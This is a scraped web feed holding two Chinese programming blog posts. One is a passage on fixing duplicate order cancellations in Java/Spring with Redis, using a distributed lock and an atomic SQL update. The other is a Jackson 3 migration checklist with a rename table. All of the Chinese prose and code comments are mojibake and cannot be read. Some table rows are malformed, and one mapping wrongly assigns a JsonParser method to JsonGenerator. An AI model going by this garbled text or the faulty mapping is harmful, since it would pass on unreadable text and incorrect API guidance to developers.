    <span class="hljs-keyword">private</span> OrderService orderService;

    <span class="hljs-comment">// æ¯5åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡</span>
    <span class="hljs-meta">@Scheduled(cron = "0 0/5 * * * ?")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancelTimeoutOrders</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æŸ¥è¯¢30åˆ†é’Ÿå‰æœªæ”¯ä»˜çš„è®¢å•</span>
        List&lt;Order&gt; timeoutOrders = orderService.queryUnpaidOrdersBefore(LocalDateTime.now().minusMinutes(<span class="hljs-number">30</span>));
        <span class="hljs-keyword">for</span> (Order order : timeoutOrders) {
            <span class="hljs-comment">// æ‰§è¡Œå–æ¶ˆè®¢å•é€»è¾‘ï¼ˆæ‰£å‡çš„åº“å­˜å›æ»šï¼‰</span>
            orderService.cancelOrder(order.getId());
        }
    }
}
</code></pre>
<h3 data-id="heading-3">Redis è¿‡æœŸé€šçŸ¥å–æ¶ˆè®¢å•</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisKeyExpireListener</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> StringRedisTemplate redisTemplate;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderService orderService;

    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// è®¢é˜…Redisè¿‡æœŸé”®é€šçŸ¥</span>
        redisTemplate.getConnectionFactory().getConnection().subscribe(
            message -&gt; {
                <span class="hljs-comment">// æ¶ˆæ¯å†…å®¹ä¸ºè¿‡æœŸçš„é”®åï¼Œæ ¼å¼ï¼šorder:timeout:{orderId}</span>
                <span class="hljs-type">String</span> <span class="hljs-variable">expiredKey</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody());
                <span class="hljs-keyword">if</span> (expiredKey.startsWith(<span class="hljs-string">"order:timeout:"</span>)) {
                    <span class="hljs-type">String</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> expiredKey.split(<span class="hljs-string">":"</span>)[<span class="hljs-number">2</span>];
                    <span class="hljs-comment">// æ‰§è¡Œå–æ¶ˆè®¢å•é€»è¾‘</span>
                    orderService.cancelOrder(Long.parseLong(orderId));
                }
            },
            <span class="hljs-string">"__keyevent@0__:expired"</span>.getBytes()
        );
    }
}
</code></pre>
<h3 data-id="heading-4">è®¢å•æœåŠ¡ï¼ˆå–æ¶ˆè®¢å•é€»è¾‘ï¼‰</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderMapper orderMapper;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ProductMapper productMapper;

    <span class="hljs-comment">/**
     * å–æ¶ˆè®¢å•ï¼ˆå›æ»šåº“å­˜ï¼‰
     */</span>
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancelOrder</span><span class="hljs-params">(Long orderId)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderMapper.selectById(orderId);
        <span class="hljs-keyword">if</span> (order == <span class="hljs-literal">null</span> || order.getStatus() != <span class="hljs-number">0</span>) { <span class="hljs-comment">// 0-æœªæ”¯ä»˜</span>
            <span class="hljs-keyword">return</span>;
        }
        <span class="hljs-comment">// 1. æ›´æ–°è®¢å•çŠ¶æ€ä¸ºå–æ¶ˆ</span>
        order.setStatus(<span class="hljs-number">2</span>); <span class="hljs-comment">// 2-å·²å–æ¶ˆ</span>
        orderMapper.updateById(order);
        <span class="hljs-comment">// 2. å›æ»šå•†å“åº“å­˜</span>
        productMapper.increaseStock(order.getProductId(), order.getQuantity());
    }

    <span class="hljs-comment">// å…¶ä»–æ–¹æ³•ï¼šqueryUnpaidOrdersBeforeç­‰</span>
}
</code></pre>
<h2 data-id="heading-5">ä¸‰ã€é—®é¢˜æè¿°</h2>
<ol>
<li>
<p><strong>é¢„æœŸè¡Œä¸º</strong>ï¼šæ¯ä¸ªè¶…æ—¶æœªæ”¯ä»˜çš„è®¢å•ä»…è¢«å–æ¶ˆä¸€æ¬¡ï¼Œåº“å­˜æ­£ç¡®å›æ»šä¸€æ¬¡ã€‚</p>
</li>
<li>
<p><strong>å®é™…è¡Œä¸º</strong>ï¼šéƒ¨åˆ†è®¢å•è¢«é‡å¤å–æ¶ˆï¼Œå¯¼è‡´åº“å­˜å¤šæ¬¡å›æ»šï¼ˆä¾‹å¦‚ï¼Œå®é™…åº“å­˜ 10 ä»¶ï¼Œè®¢å•è´­ä¹° 2 ä»¶ï¼Œé‡å¤å–æ¶ˆ 3 æ¬¡ååº“å­˜å˜ä¸º 16 ä»¶ï¼‰ã€‚åŸå› å¦‚ä¸‹ï¼š</p>
<ul>
<li><strong>å®šæ—¶ä»»åŠ¡ä¸ Redis é€šçŸ¥å†²çª</strong>ï¼šåŒä¸€è®¢å•æ—¢è¢«å®šæ—¶ä»»åŠ¡æ‰«æåˆ°ï¼Œåˆè§¦å‘äº† Redis è¿‡æœŸé€šçŸ¥ï¼Œä¸¤ç§æœºåˆ¶åŒæ—¶æ‰§è¡Œå–æ¶ˆé€»è¾‘ã€‚</li>
<li><strong>å®šæ—¶ä»»åŠ¡å†…éƒ¨å¹¶å‘</strong>ï¼šå®šæ—¶ä»»åŠ¡æ‰§è¡Œæ—¶ï¼Œè‹¥å¤„ç†æ—¶é—´è¿‡é•¿ï¼Œä¸‹ä¸€æ¬¡ä»»åŠ¡æå‰å¯åŠ¨ï¼ˆå¦‚å‰ä¸€æ¬¡æœªæ‰§è¡Œå®Œï¼Œæ–°ä»»åŠ¡å¼€å§‹ï¼‰ï¼Œå¯¼è‡´åŒä¸€æ‰¹è®¢å•è¢«é‡å¤å¤„ç†ã€‚</li>
<li><strong>è®¢å•çŠ¶æ€åˆ¤æ–­éåŸå­</strong>ï¼š<code>cancelOrder</code>Â æ–¹æ³•ä¸­ï¼Œâ€œæŸ¥è¯¢è®¢å•çŠ¶æ€â€ ä¸ â€œæ›´æ–°çŠ¶æ€â€ éåŸå­æ“ä½œï¼Œé«˜å¹¶å‘ä¸‹å¯èƒ½å¤šä¸ªçº¿ç¨‹åŒæ—¶é€šè¿‡çŠ¶æ€æ£€æŸ¥ï¼Œæ‰§è¡Œåç»­é€»è¾‘ã€‚</li>
</ul>
</li>
</ol>
<h2 data-id="heading-6">å››ã€è§£å†³æ–¹æ¡ˆ</h2>
<ol>
<li>
<p><strong>ç»Ÿä¸€è¶…æ—¶å–æ¶ˆå…¥å£</strong>ï¼šä¿ç•™ä¸€ç§ä¸»è¦æœºåˆ¶ï¼ˆå¦‚ Redis è¿‡æœŸé€šçŸ¥ï¼‰ï¼Œå®šæ—¶ä»»åŠ¡ä½œä¸ºå…œåº•ï¼Œä¸”å…œåº•ä»»åŠ¡å¢åŠ å¹‚ç­‰æ€§æ ¡éªŒã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å®šæ—¶ä»»åŠ¡ä¼˜åŒ–ï¼šä»…å¤„ç†æœªè¢«Redisé€šçŸ¥å¤„ç†çš„è®¢å•</span>
<span class="hljs-meta">@Scheduled(cron = "0 0/5 * * * ?")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancelTimeoutOrders</span><span class="hljs-params">()</span> {
    List&lt;Order&gt; timeoutOrders = orderService.queryUnpaidOrdersBefore(LocalDateTime.now().minusMinutes(<span class="hljs-number">35</span>)); <span class="hljs-comment">// æ¯”Redisè¿‡æœŸæ—¶é—´æ™š5åˆ†é’Ÿï¼Œç¡®ä¿Rediså·²å¤„ç†</span>
    <span class="hljs-keyword">for</span> (Order order : timeoutOrders) {
        orderService.cancelOrder(order.getId());
    }
}
</code></pre>
</li>
<li>
<p><strong>å®šæ—¶ä»»åŠ¡åŠ åˆ†å¸ƒå¼é”</strong>ï¼šé˜²æ­¢ä»»åŠ¡å¹¶å‘æ‰§è¡Œï¼Œç¡®ä¿åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªå®ä¾‹çš„å®šæ—¶ä»»åŠ¡åœ¨è¿è¡Œã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Scheduled(cron = "0 0/5 * * * ?")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancelTimeoutOrders</span><span class="hljs-params">()</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">lockKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"lock:order:cancel:schedule"</span>;
    <span class="hljs-type">Boolean</span> <span class="hljs-variable">locked</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().setIfAbsent(lockKey, <span class="hljs-string">"1"</span>, <span class="hljs-number">1</span>, TimeUnit.MINUTES);
    <span class="hljs-keyword">if</span> (Boolean.TRUE.equals(locked)) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// æ‰§è¡Œå–æ¶ˆé€»è¾‘</span>
            List&lt;Order&gt; timeoutOrders = orderService.queryUnpaidOrdersBefore(LocalDateTime.now().minusMinutes(<span class="hljs-number">35</span>));
            <span class="hljs-keyword">for</span> (Order order : timeoutOrders) {
                orderService.cancelOrder(order.getId());
            }
        } <span class="hljs-keyword">finally</span> {
            redisTemplate.delete(lockKey);
        }
    }
}
</code></pre>
</li>
<li>
<p><strong>è®¢å•çŠ¶æ€æ›´æ–°åŸå­åŒ–</strong>ï¼šé€šè¿‡ SQL æ¡ä»¶æ›´æ–°ç¡®ä¿çŠ¶æ€åˆ¤æ–­ä¸æ›´æ–°çš„åŸå­æ€§ï¼Œæ›¿ä»£å…ˆæŸ¥åæ›´ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancelOrder</span><span class="hljs-params">(Long orderId)</span> {
    <span class="hljs-comment">// 1. åŸå­æ›´æ–°è®¢å•çŠ¶æ€ï¼ˆä»…å½“çŠ¶æ€ä¸º0æ—¶æ›´æ–°ä¸º2ï¼‰</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">updateRows</span> <span class="hljs-operator">=</span> orderMapper.updateStatusToCanceled(orderId);
    <span class="hljs-keyword">if</span> (updateRows == <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span>; <span class="hljs-comment">// çŠ¶æ€å·²å˜æ›´ï¼Œæ— éœ€å¤„ç†</span>
    }
    <span class="hljs-comment">// 2. å›æ»šåº“å­˜ï¼ˆä»…å½“çŠ¶æ€æ›´æ–°æˆåŠŸæ—¶æ‰§è¡Œï¼‰</span>
    <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderMapper.selectById(orderId);
    productMapper.increaseStock(order.getProductId(), order.getQuantity());
}
</code></pre>
<p>å¯¹åº”çš„ SQLï¼ˆOrderMapper.xmlï¼‰ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"updateStatusToCanceled"</span>&gt;</span>
    UPDATE `order` 
    SET status = 2, cancel_time = NOW() 
    WHERE id = #{orderId} AND status = 0
<span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span>
</code></pre>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Jackson 3 è¿ç§»æ ¸å¿ƒæ³¨æ„ç‚¹æ€»ç»“]]></title>    <link>https://juejin.cn/post/7581727073580941363</link>    <guid>https://juejin.cn/post/7581727073580941363</guid>    <pubDate>2025-12-10T00:44:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581727073580941363" data-draft-id="7581666815002509363" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Jackson 3  è¿ç§»æ ¸å¿ƒæ³¨æ„ç‚¹æ€»ç»“"/> <meta itemprop="keywords" content="JSON,Java"/> <meta itemprop="datePublished" content="2025-12-10T00:44:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é—²ç…®å…‰é˜´"/> <meta itemprop="url" content="https://juejin.cn/user/1523239911963420"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Jackson 3  è¿ç§»æ ¸å¿ƒæ³¨æ„ç‚¹æ€»ç»“
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1523239911963420/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é—²ç…®å…‰é˜´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T00:44:30.000Z" title="Wed Dec 10 2025 00:44:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€æ ¸å¿ƒè¦ç‚¹ï¼ˆå¿…æŒæ¡ï¼Œè¿ç§»åŸºç¡€ï¼‰</h2>
<p><strong>1. ç¯å¢ƒåŸºçº¿å‡çº§ï¼š</strong> æœ€ä½æ”¯æŒ JDK 17ï¼ˆ2.x ä¸º JDK 8ï¼‰ï¼Œé¡¹ç›®éœ€å…ˆå®Œæˆ JDK å‡çº§é€‚é…ã€‚</p>
<p><strong>2. åŒ…åä¸ä¾èµ–å˜æ›´ï¼š</strong></p>
<ul>
<li>Maven groupIdï¼šcom.fasterxml.jacksonÂ â†’Â tools.jacksonï¼ˆjackson-annotationsÂ é™¤å¤–ï¼Œä»ç”¨ 2.x ç‰ˆæœ¬ï¼‰Java å¯¼å…¥åŒ…ï¼š</li>
<li>com.fasterxml.jackson.xxxÂ â†’Â tools.jackson.xxxï¼ˆcom.fasterxml.jackson.annotationÂ ä¿ç•™ä¸å˜ï¼‰</li>
</ul>
<p><strong>3. æ ¸å¿ƒ API ä¸å¯å˜æ€§ï¼š</strong> ObjectMapperï¼ˆåŠå­ç±»ï¼‰ã€JsonFactoryï¼ˆåŠå­ç±»ï¼‰å˜ä¸ºå®Œå…¨ä¸å¯å˜ï¼Œå¿…é¡»é€šè¿‡ Builder æ¨¡å¼æ„å»ºï¼ˆä¸å†æ”¯æŒç›´æ¥ set é…ç½®ï¼‰ã€‚</p>
<pre><code class="hljs language-java" lang="java">JsonMapper m=JsonMapper.builder().build();
<span class="hljs-type">JsonFactory</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> JsonFactory.builder().build();
</code></pre>
<p><strong>4 .å¼‚å¸¸ä½“ç³»é‡æ„ï¼š</strong> æ‰€æœ‰å¼‚å¸¸æ”¹ä¸ºéæ£€æŸ¥å‹ï¼ˆç»§æ‰¿Â RuntimeExceptionï¼‰ï¼Œæ ¸å¿ƒå¼‚å¸¸ç±»é‡å‘½åï¼ˆå¦‚Â JsonProcessingExceptionÂ â†’Â JacksonExceptionï¼‰ã€‚
<strong>5. æ ¼å¼ç»‘å®šå¼ºåˆ¶åŒ–ï¼š</strong> å¿…é¡»ä½¿ç”¨æ ¼å¼å¯¹é½çš„Â ObjectMapperÂ å­ç±»ï¼ˆå¦‚Â JsonMapperã€YAMLMapperã€XmlMapperï¼‰ï¼Œç¦æ­¢Â new ObjectMapper(new YAMLFactory())Â å†™æ³•ã€‚
<strong>6. Java 8 æ¨¡å—å†…ç½®ï¼š</strong> jackson-module-parameter-namesã€jackson-datatype-jdk8ã€jackson-datatype-jsr310Â å·²æ•´åˆåˆ°Â jackson-databindï¼Œæ— éœ€å•ç‹¬ä¾èµ–ã€‚</p>
<h2 data-id="heading-1">äºŒã€å…³é”®å˜æ›´ï¼ˆå½±å“ä»£ç æ”¹é€ ï¼‰</h2>
<p><strong>1. å†…å®¹ç§»é™¤</strong></p>
<ul>
<li>ç‰ˆæœ¬æ ‡è®°ä¸ºÂ @DeprecatedÂ çš„æ–¹æ³•ã€å­—æ®µã€ç±»å…¨éƒ¨åˆ é™¤ï¼ˆ å‚è€ƒ 2.20 javadoc æ›¿æ¢ä¸ºæ›¿ä»£æ–¹æ¡ˆï¼‰ã€‚</li>
<li>ç§»é™¤æ¨¡å— jackson-module-jsonSchemaÂ ã€jackson-datatype-hibernateXã€‚</li>
<li>ç§»é™¤åŠŸèƒ½ï¼šæ ¼å¼è‡ªåŠ¨æ£€æµ‹ï¼ˆDataFormatDetectorÂ ç­‰ç›¸å…³ç±»ï¼‰ã€ObjectMapper.canSerialize()/canDeserialize()Â æ–¹æ³•ã€‚</li>
<li>JsonParser <code>canWriteBinaryNatively(),Â canWriteFormattedNumbers() </code>åˆ†åˆ«æ›¿ä¸ºÂ <code>Â StreamWriteCapability.CAN_WRITE_BINARY_NATIVELYÂ Â /Â Â StreamWriteCapability.CAN_WRITE_FORMATTED_NUMBERS</code></li>
<li>JsonFactory  <code>getCodec()Â ã€Â setCodec()</code>Â è¢«ç§»é™¤</li>
<li>com.fasterxml.jackson.databind.MappingJsonFactoryÂ Â è¢«ç§»é™¤</li>
<li>com.fasterxml.jackson.core.ObjectCodec è¢«ç§»é™¤ï¼Œæ›¿æ¢ä¸º 2 ä¸ªç‹¬ç«‹çš„æ¥å£ï¼šÂ Â tools.jackson.core.ObjectReadContextï¼ˆå®ç°ç±»ï¼šDeserializationContextï¼‰Â ï¼ŒÂ tools.jackson.core.ObjectWriteContextï¼ˆå®ç°ç±»ï¼š
SerializationContextÂ ï¼‰</li>
<li>tools.jackson.databind.jsontype.impl.LaissezFaireSubTypeValidator å·²ä¸å†å…¬å¼€ã€‚è¯·ä½¿ç”¨Â Â BasicPolymorphicTypeValidator.builder()</li>
<li>JsonGenerator.setPrettyPrinter() è¢«ç§»é™¤</li>
<li>request payload èƒ½åŠ›è¢«ç§»é™¤</li>
<li>BufferRecyclers.SYSTEM_PROPERTY_TRACK_REUSABLE_BUFFERS è¢«ç§»é™¤</li>
<li>TokenStreamFactory.Feature.USE_THREAD_LOCAL_FOR_BUFFER_RECYCLING è¢«ç§»é™¤</li>
<li>åœ¨ Jackson 2.x çš„Â JsonFactoryÂ ç±»ä¸­ï¼Œæ¥å—Â URLÂ å‚æ•°çš„å·¥å‚æ–¹æ³•å°†è¢«ç§»é™¤</li>
</ul>
<p><strong>2. ç±»ä¸æ–¹æ³•é‡å‘½åï¼ˆé«˜é¢‘å˜æ›´ï¼‰</strong></p>















































































































































<table><thead><tr><th>2.x æ—§åç§°</th><th>3.x æ–°åç§°</th></tr></thead><tbody><tr><td>JsonProcessingException</td><td>JacksonExceptionï¼ˆåŸºç±»ï¼‰</td></tr><tr><td>JsonParseException</td><td>StreamReadException</td></tr><tr><td>JsonEOFExceptionÂ </td><td>UnexpectedEndOfInputExceptionÂ </td><td/><td>JsonGenerationExceptionÂ Â </td><td>StreamWriteExceptionÂ </td></tr><tr><td>JsonGenerator.writeObject()</td><td>JsonGenerator.writePOJO()</td></tr><tr><td>JsonGenerator.getCurrentValue()</td><td>JsonGenerator.currentValue()</td><td/><td>JsonGenerator.setCurrentValue()</td><td>JsonGenerator.assignCurrentValue()</td></tr><tr><td>JsonGenerator.getCodec()</td><td>JsonGenerator.objectWriteContext()</td></tr><tr><td>JsonParser.getCurrentLocation()</td><td>JsonParser.currentLocation()</td></tr><tr><td>JsonParser.getTokenLocation()</td><td>JsonGenerator.currentTokenLocation()</td></tr><tr><td>JsonParser.getCurrentValue()</td><td>JsonParser.currentValue()</td></tr><tr><td>JsonParser.setCurrentValue()</td><td>JsonParser.assignCurrentValue()</td></tr><tr><td>JsonParser."xxxTextYyy"() æ ¼å¼ å¦‚ï¼ˆgetTextCharacters()ï¼‰</td><td>JsonParser."xxxStringYyy"() æ ¼å¼ å¦‚ï¼ˆgetStringCharacters()ï¼‰</td></tr><tr><td>JsonParser.getCodec()</td><td>JsonParser.objectReadContext()</td></tr><tr><td>JsonToken.FIELD_NAME</td><td>JsonToken.PROPERTY_NAME</td></tr><tr><td>JsonFactoryÂ </td><td>TokenStreamFactoryÂ </td></tr><tr><td>JsonStreamContextÂ </td><td>TokenStreamContextÂ </td></tr><tr><td>JsonLocationÂ </td><td>TokenStreamLocation</td></tr><tr><td>JsonDeserializer</td><td>ValueDeserializer</td></tr><tr><td>JsonSerializer</td><td>ValueSerializer</td></tr><tr><td>JsonMappingException</td><td>DatabindException</td></tr><tr><td>Module</td><td>JacksonModuleï¼ˆé¿å…ä¸ JDK Module å†²çªï¼‰</td></tr><tr><td>TextNode</td><td>StringNode</td></tr><tr><td>BeanSerializerModifier</td><td>ValueSerializerModifier</td></tr><tr><td>BeanDeserializerModifier</td><td>ValueDeserializerModifier</td></tr><tr><td>SerializerProviderÂ </td><td>SerializationContextÂ </td></tr><tr><td>TextNode</td><td>StringNode</td></tr><tr><td>AnnotationIntrospector.findDefaultCreator()</td><td>findPreferredCreator()</td></tr><tr><td>JsonNode.elements()</td><td>JsonNode.values()</td></tr><tr><td>ContainerSerializer</td><td>StdContainerSerializer</td></tr><tr><td>ObjectMapper.getRegisteredModuleIds()</td><td>ObjectMapper.registeredModules()</td></tr><tr><td>TreeNode.propertyNames()Â Â çš„è¿”å›ç±»å‹</td><td>ä»Â Â IteratorÂ Â æ›´æ”¹ä¸ºÂ Â Collection</td></tr><tr><td>TreeNode.isContainerNode()</td><td>TreeNode. isContainer()</td></tr><tr><td>JsonGenerator.Feature.AUTO_CLOSE_JSON_CONTENT</td><td>JsonGenerator.Feature.AUTO_CLOSE_CONTENT</td></tr></tbody></table>
<p><strong>3. é…ç½®é»˜è®¤å€¼å˜æ›´ï¼ˆæ˜“å¼•å‘è¡Œä¸ºå·®å¼‚ï¼‰</strong></p>




















































































































































































